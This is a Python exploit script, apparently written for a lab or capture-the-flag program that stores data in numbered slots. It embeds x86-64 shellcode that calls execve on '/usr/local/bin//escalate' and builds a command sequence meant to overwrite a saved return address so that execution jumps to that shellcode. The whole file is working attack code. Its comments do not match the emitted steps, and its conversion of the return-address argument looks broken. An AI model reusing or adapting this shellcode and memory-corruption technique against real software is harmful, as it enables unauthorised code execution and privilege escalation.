import struct, sys

# Your shellcode (56 bytes)
raw_shellcode = b"\x48\x83\xc4\x80\x48\x31\xd2\x52\x48\xbb\x65\x73\x63\x61\x6c\x61\x74\x65\x53\x48\xbb\x61\x6c\x2f\x62\x69\x6e\x2f\x2f\x53\x48\xbb\x2f\x75\x73\x72\x2f\x6c\x6f\x63\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"

if len(sys.argv) != 3:
    raise ValueError("Please provide the following command line arguments: <return_address> <slot_1_address>")

# 1. Allocate shell code slot to string --> "allocate 1 3"
# 2. Fill the slot with shell code (56 bytes) --> "setstring 1 {shellcode}"
# 3. Allocate slot for buffer overflow to string --> "allocate 2 3"
# 4. Fill the slot with the return address from set_string (rbp+0x08) --> "setint 2 0x7fffffffe168" 
# 5. Fill the slot as a string with the address of slot 1 (+ 4 bytes) --> "setstring 2 0x55555555a740"
# 6. Print slot 2 --> "print 2"

# Whole thing --> "allocate 1 3\nsetstring 1 {shellcode}\nallocate 2 3\nsetint 2 0x7fffffffe168\nsetstring 2 0x555555558044\nprint 2"

return_address = sys.argv[1].encode()
slot_1_address = sys.argv[2].encode()

allocate_1 = b"allocate 1 3\n"
setstring_1 = b"setstring 1 " + raw_shellcode + b"\n"
allocate_2 = b"allocate 2 3\n"
print_1 = b"print 1\n"
setint_2 = b"setint 2 " + f"{int.from_bytes(return_address, byteorder='little')}".encode() + b"\n"
DEBUG_PRINTS = b"print 1\nprint 2\n"
setstring_2 = b"setstring 2 " + struct.pack('<Q', int(slot_1_address, 16)) + b"\n"
print_2 = b"print 2\n"

output = allocate_1 + setstring_1 + allocate_2 + print_1 + setint_2 + DEBUG_PRINTS + setstring_2 + print_2
sys.stdout.buffer.write(output)